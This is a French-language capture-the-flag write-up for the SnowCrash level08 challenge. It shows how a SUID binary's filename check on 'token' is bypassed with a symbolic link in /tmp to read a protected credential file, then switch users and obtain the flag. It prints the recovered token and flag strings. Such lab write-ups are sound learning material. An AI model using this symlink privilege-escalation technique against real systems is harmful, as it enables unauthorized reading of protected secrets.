# LEVEL08

Le système de fichier nous informe que nous avons un fichier "token" pour lequel nous n'avons aucune permission et un executable "level08" que nous pouvons exécuter en SUID.

``` bash
level08@SnowCrash:~$ ls -la
total 28
dr-xr-x---+ 1 level08 level08  140 Mar  5  2016 .
d--x--x--x  1 root    users    340 Aug 30  2015 ..
-r-x------  1 level08 level08  220 Apr  3  2012 .bash_logout
-r-x------  1 level08 level08 3518 Aug 30  2015 .bashrc
-rwsr-s---+ 1 flag08  level08 8617 Mar  5  2016 level08
-r-x------  1 level08 level08  675 Apr  3  2012 .profile
-rw-------  1 flag08  flag08    26 Mar  5  2016 token
```

``` bash
level08@SnowCrash:~$ getfacl level08
# file: level08
# owner: flag08
# group: level08
# flags: ss-
user::rwx
group::---
group:level08:r-x
group:flag08:r-x
mask::r-x
other::---
```

L'utilisation de `ltrace` révèle que le programme prend en argument un fichier, qu'il va ouvrir, lire et restituer lson contenu (`open()`, `read()`, `write()`). Mais nous ne pouvons pas transmettre directement le fichier token au programme, une protection vérifie en effet que le nom du fichier ne doit pas comporter le mot "token".

``` bash
level08@SnowCrash:~$ ltrace ./level08 /tmp/test
__libc_start_main(0x8048554, 2, 0xbffff7d4, 0x80486b0, 0x8048720 <unfinished ...>
strstr("/tmp/test", "token")                                            = NULL
open("/tmp/test", 0, 014435162522)                                      = 3
read(3, "coucou\n", 1024)                                               = 7
write(1, "coucou\n", 7coucou
)                                                 = 7
+++ exited (status 7) +++

```

Ici on ne peut pas passer directement directement la commande `getflag` dans les appel systèmes `open()`, `read()` et `write()` (contrairement à `system()`).

Afin de pouvoir lire le contenu du fichier token on va donc créer un lien symbolique avec `ln -s`. 
Nous créeons un lien symbolique car n'ailant les permissions que pour créer de nouveau fichier que dans `/tmp`, le dossier se situant dans une partition différente de celle de `/home`, il n'est pas possible de générer un lien physique.

``` bash
level08@SnowCrash:~$ ln -s /home/user/level08/token /tmp/haha
level08@SnowCrash:~$ ./level08 /tmp/haha
quif5eloekouj29ke0vouxean

level08@SnowCrash:~$ su flag08
Password: 
Don't forget to launch getflag !
flag08@SnowCrash:~$ getflag
Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f

```

Sources:
    - https://blog.microlinux.fr/liens/
    - https://www.it-connect.fr/comprendre-les-liens-physiques-hard-links-et-les-liens-symboliques-soft-links/

